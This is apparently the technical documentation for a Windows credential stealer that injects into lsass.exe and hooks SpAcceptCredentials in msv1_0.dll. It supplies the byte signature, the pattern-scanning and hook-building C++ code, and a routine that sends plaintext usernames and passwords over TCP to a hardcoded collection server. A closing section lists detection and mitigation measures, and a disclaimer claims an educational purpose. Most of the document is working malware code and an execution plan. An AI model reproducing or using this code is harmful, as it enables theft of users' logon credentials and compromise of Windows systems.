# technical documentation - msv1_0.dll credential stealer

## table of contents
1. [overview](#overview)
2. [library dependencies](#library-dependencies)
3. [assembly code analysis](#assembly-code-analysis)
4. [function hooking mechanism](#function-hooking-mechanism)
5. [pe headers and memory layout](#pe-headers-and-memory-layout)
6. [pattern scanning](#pattern-scanning)
7. [hook construction](#hook-construction)
8. [function pointer casting](#function-pointer-casting)
9. [complete execution flow](#complete-execution-flow)
10. [security considerations](#security-considerations)

## overview

this stealer grabs plaintext credentials during windows logins by hooking the `SpAcceptCredentials` function in `msv1_0.dll`. here's what it does:

- **pattern scanning**: finds the target function in memory using byte signatures
- **function hooking**: patches the function to redirect execution to our code
- **credential interception**: captures usernames and passwords during authentication
- **network transmission**: sends stolen creds via tcp to a remote server
- **transparent operation**: keeps the system working normally while stealing credentials

## library dependencies

### core windows headers
```cpp
#include <iostream>      // standard i/o operations
#include <Windows.h>     // windows api functions and types
#include <cstring>       // std::memcpy() for memory operations
#include <winsock2.h>    // tcp networking for sending credentials
#include <ws2tcpip.h>    // additional tcp functions
```

### security-specific headers
```cpp
#define SECURITY_WIN32   // enable 32-bit security definitions
#include <Sspi.h>        // security support provider interface
#include <ntsecapi.h>    // nt security api structures
#include <ntsecpkg.h>    // nt security package structures
```

**what each header does:**
- **`Sspi.h`**: provides security structures and authentication functions
- **`ntsecapi.h`**: defines `SECURITY_LOGON_TYPE`, `UNICODE_STRING`, and other security types
- **`ntsecpkg.h`**: provides `SECPKG_PRIMARY_CRED` and `SECPKG_SUPPLEMENTAL_CRED` structures
- **`cstring`**: provides `std::memcpy()` for safe memory copying operations
- **`winsock2.h`**: tcp networking to send stolen credentials to remote server

## assembly code analysis

### 1. target function pattern (SpAcceptCredentials prologue)

```cpp
char startOfPatternSpAccecptedCredentials[] = { 
    0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48 
};
```

**assembly breakdown:**
```assembly
48 83 ec 20    ; sub rsp, 32          ; allocate 32 bytes on stack
49 8b d9       ; mov rbx, r9          ; save 4th parameter (supplementalcredentials)
49 8b f8       ; mov rdi, r8          ; save 3rd parameter (primarycredentials)  
8b f1          ; mov esi, ecx         ; save 1st parameter (logontype)
48             ; (part of next instruction)
```

**what this represents:**
- **function prologue**: standard x64 function entry point
- **stack allocation**: `sub rsp, 32` allocates local variable space
- **parameter preservation**: saves function parameters to registers for later use
- **x64 calling convention**: parameters passed in `rcx`, `rdx`, `r8`, `r9`

### 2. hook assembly code

```cpp
char bytesToPatchSpAccecptedCredentials[12] = { 0x48, 0xb8 };
```

**assembly breakdown:**
```assembly
48 b8 [8-byte-address]  ; mov rax, <64-bit-address-of-hook-function>
ff e0                    ; jmp rax                    ; jump to hook function
```

**what this does:**
- **load hook address**: `mov rax, <address>` loads our function address into `rax`
- **jump to hook**: `jmp rax` transfers execution to our hook function
- **total size**: 10 bytes (2 + 8 + 2)

## function hooking mechanism

### how function hooking works

**the magic of interception:**
1. **original call**: windows calls `SpAcceptCredentials(rcx, rdx, r8, r9)`
2. **patched entry**: first instruction is replaced with our hook code
3. **execution redirect**: instead of normal function prologue, our code executes
4. **parameter preservation**: same parameters are available to our hook function
5. **transparent operation**: user still logs in successfully

### parameter passing explanation

**why our hook gets the right parameters:**
```cpp
// windows calls:
SpAcceptCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);

// but we've patched the entry point to:
mov rax, <hookedSpAccecptedCredentials>
jmp rax

// our function receives the same parameters:
hookedSpAccecptedCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
```

**x64 calling convention:**
- `rcx` = 1st parameter (logontype)
- `rdx` = 2nd parameter (accountname)
- `r8` = 3rd parameter (primarycredentials)
- `r9` = 4th parameter (supplementalcredentials)
- stack = additional parameters (if any)

## pe headers and memory layout

### pe file structure

```cpp
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetModule;
PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetModule + dosHeader->e_lfanew);
SIZE_T sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
```

**pe header components:**

1. **dos header** (`PIMAGE_DOS_HEADER`):
   - located at the very beginning of the dll
   - contains `e_lfanew` field pointing to nt header
   - legacy compatibility header

2. **nt header** (`PIMAGE_NT_HEADERS`):
   - contains file header and optional header
   - `OptionalHeader.SizeOfImage` = total size of dll in memory
   - critical for determining scan boundaries

**memory layout:**
```
msv1_0.dll in memory:
┌─────────────────┐
│   dos header    │ ← targetmodule
├─────────────────┤
│   nt header     │ ← targetmodule + e_lfanew
├─────────────────┤
│   code section  │ ← where we scan for patterns
├─────────────────┤
│   data section  │
├─────────────────┤
│   ...           │
└─────────────────┘ ← targetmodule + sizeofimage
```

**why we need sizeofimage:**
- **scan boundaries**: pattern scanner needs to know where to stop
- **memory safety**: prevents scanning beyond dll boundaries
- **efficiency**: avoids unnecessary memory access

## pattern scanning

### pattern matching algorithm

```cpp
PVOID GetPatternMemoryAddress(char *startAddress, char *pattern, SIZE_T patternSize, SIZE_T searchBytes)
{
    unsigned int index = 0;
    PVOID patternAddress = NULL;
    char *patternByte = 0;
    char *memoryByte = 0;
    
    do {
        if (startAddress[index] == pattern[0]) {
            for (size_t i = 1; i < patternSize; i++) {
                *(char *)&patternByte = pattern[i];
                *(char *)&memoryByte = startAddress[index + i];
                
                if (patternByte != memoryByte) {
                    break;
                }
                
                if (i == patternSize - 1) {
                    patternAddress = (LPVOID)(&startAddress[index]);
                    return patternAddress;
                }
            }
        }
        ++index;
    } while (index < searchBytes);
    
    return (PVOID)NULL;
}
```

**algorithm steps:**
1. **linear scan**: search through memory byte by byte
2. **first byte match**: look for first byte of pattern
3. **full pattern check**: if first byte matches, check remaining bytes
4. **return address**: return address of pattern start if found

**pattern location calculation:**
```cpp
patternStartAddressOfSpAccecptedCredentials = GetPatternMemoryAddress(...);
addressOfSpAcceptCredentials = (LPVOID)((DWORD_PTR)patternStartAddressOfSpAccecptedCredentials - 16);
```

**why -16:**
- pattern is found **inside** the function
- function entry point is 16 bytes **before** the pattern
- this gives us the actual function start address

## credential transmission

### tcp client implementation

the stealer sends credentials via tcp to a remote server instead of writing to disk:

```cpp
BOOL SendCredentials(const wchar_t* username, const wchar_t* password)
{
    // convert unicode to ascii for transmission
    char username_ascii[256] = {0};
    char password_ascii[256] = {0};
    WideCharToMultiByte(CP_UTF8, 0, username, -1, username_ascii, 256, NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, password, -1, password_ascii, 256, NULL, NULL);
    
    // format exactly like netcat: "username:password"
    char msg[512];
    sprintf_s(msg, sizeof(msg), "%s:%s", username_ascii, password_ascii);
    
    // tcp connection to 10.0.0.80:9999
    // ... socket code ...
}
```

**transmission details:**
- **format**: `username:password` (simple colon-separated)
- **target**: hardcoded to `10.0.0.80:9999`
- **protocol**: raw tcp socket connection
- **encoding**: utf-8 for international characters
- **behavior**: fire-and-forget (no error handling for network failures)

### docker-based server

the receiving server runs in a docker container with two components:

**server.py** (port 9999):
- listens for tcp connections from the dll
- parses `username:password` format
- saves credentials to `creds.json` with timestamps and source ip

**webapp.py** (port 8080):
- flask web interface to view captured credentials
- login protected (password: `BallsInYourFace69!`)
- provides json api and web ui for credential review
- allows filtering by source ip address

## hook construction

### step-by-step assembly building

**step 1: backup original function**
```cpp
std::memcpy(bytesToRestoreSpAccecptedCredentials, addressOfSpAcceptCredentials, sizeof(bytesToRestoreSpAccecptedCredentials));
```
- **purpose**: save original 12 bytes for later restoration
- **why**: need to temporarily "unhook" to call original function

**step 2: build hook assembly**
```cpp
char bytesToPatchSpAccecptedCredentials[12] = { 0x48, 0xb8 };
```
- **initial state**: `[48, b8, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00]`
- **assembly**: `mov rax, <placeholder-address>`

**step 3: insert function address**
```cpp
DWORD_PTR addressBytesOfhookedSpAccecptedCredentials = (DWORD_PTR)&hookedSpAccecptedCredentials;
std::memcpy(bytesToPatchSpAccecptedCredentials + 2, &addressBytesOfhookedSpAccecptedCredentials, sizeof(&addressBytesOfhookedSpAccecptedCredentials));
```
- **why +2**: skip `mov rax` instruction (2 bytes: `48 b8`)
- **result**: `[48, b8, <8-byte-address>, 00, 00, 00, 00]`

**step 4: add jump instruction**
```cpp
std::memcpy(bytesToPatchSpAccecptedCredentials + 2 + sizeof(&addressBytesOfhookedSpAccecptedCredentials), (PVOID)&"\xff\xe0", 2);
```
- **why +2 + 8**: skip `mov rax` (2) + address (8) = position 10
- **result**: `[48, b8, <8-byte-address>, ff, e0, 00, 00]`
- **assembly**: `mov rax, <address>; jmp rax`

**final assembly:**
```assembly
mov rax, <hookedSpAccecptedCredentials>  ; load our function address
jmp rax                                  ; jump to our function
```

## function pointer casting

### the casting mechanism

```cpp
_SpAcceptCredentials originalSpAcceptCredentials = (_SpAcceptCredentials)addressOfSpAcceptCredentials;
```

**what's happening:**
- `addressOfSpAcceptCredentials` = `PVOID` (raw memory address)
- `_SpAcceptCredentials` = function pointer type
- **cast**: convert raw address to callable function pointer

**function pointer type definition:**
```cpp
using _SpAcceptCredentials = NTSTATUS(NTAPI *)(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);
```

**why this works:**
- **same signature**: our hook and original have identical signatures
- **same calling convention**: both use `NTAPI` (`__stdcall` on x64)
- **parameter compatibility**: same parameter types and order

**usage:**
```cpp
// can't call raw address:
addressOfSpAcceptCredentials(params); // error!

// can call function pointer:
originalSpAcceptCredentials(params); // works!
```

## complete execution flow

### 1. dll injection phase
```
dll injected into lsass.exe
↓
dllmain(dll_process_attach) called
↓
installspaccecptedcredentialshook() called
```

### 2. hook installation phase
```
getmodulehandlea("msv1_0.dll")
↓
parse pe headers for sizeofimage
↓
scan for spacceptcredentials pattern
↓
calculate function entry point (pattern - 16)
↓
backup original 12 bytes
↓
build hook assembly (mov rax, <hook>; jmp rax)
↓
write hook to function entry point
```

### 3. credential interception phase
```
user attempts interactive logon
↓
windows calls spacceptcredentials
↓
our hook executes instead
↓
extract username and password from parameters
↓
send credentials via tcp to remote server
↓
temporarily restore original function
↓
call original spacceptcredentials
↓
user logs in successfully
↓
reinstall hook after delay
```

### 4. hook reinstallation phase
```
createthread(installspaccecptedcredentialshook)
↓
sleep(5000ms) - allow original to complete
↓
reinstall hook for next login
```

## security considerations

### detection methods

**memory scanning:**
- look for hooked functions in `msv1_0.dll`
- detect `mov rax, <address>; jmp rax` patterns
- monitor for function entry point modifications

**network monitoring:**
- watch for tcp connections from lsass.exe
- monitor traffic to suspicious ips/ports
- detect unusual network activity from system processes

**process injection detection:**
- detect dll injection into lsass
- monitor for suspicious process modifications
- alert on unauthorized lsass access

### mitigation strategies

**credential guard:**
- prevents credential theft in memory
- isolates lsass from user mode processes
- requires uefi secure boot

**lsa protection:**
- protects lsass from injection
- requires administrative privileges to disable
- monitors for unauthorized modifications

**memory protection:**
- dep (data execution prevention)
- aslr (address space layout randomization)
- cfg (control flow guard)

### limitations

**windows version dependencies:**
- pattern signatures may change between windows versions
- function offsets can vary
- pe header structures may differ

**antivirus detection:**
- modern edr solutions detect this technique
- memory scanning can identify hooks
- behavioral analysis flags suspicious activity

**network dependencies:**
- requires network connectivity to exfiltrate credentials
- hardcoded server ip makes it easy to block
- tcp connections from lsass.exe are suspicious

**stability risks:**
- hooking system functions can cause instability
- race conditions during hook/unhook cycles
- potential for system crashes if not implemented carefully

## technical notes

### architecture requirements
- **target**: x64 windows systems only
- **dependencies**: windows security apis, winsock2
- **memory permissions**: requires rwx memory for hooking
- **privileges**: administrative access required

### performance impact
- **minimal**: hook adds negligible overhead
- **memory**: small memory footprint for hook code
- **cpu**: pattern scanning is o(n) but only done once
- **network**: tcp connection overhead when credentials are captured

### reliability considerations
- **error handling**: graceful fallbacks for failed operations
- **thread safety**: delay-based re-hooking prevents race conditions
- **memory safety**: proper bounds checking in pattern scanning
- **network operations**: fire-and-forget tcp transmission (no error handling)

---

**disclaimer**: this documentation is for educational purposes only. the techniques described should only be used in authorized testing environments with proper permissions. 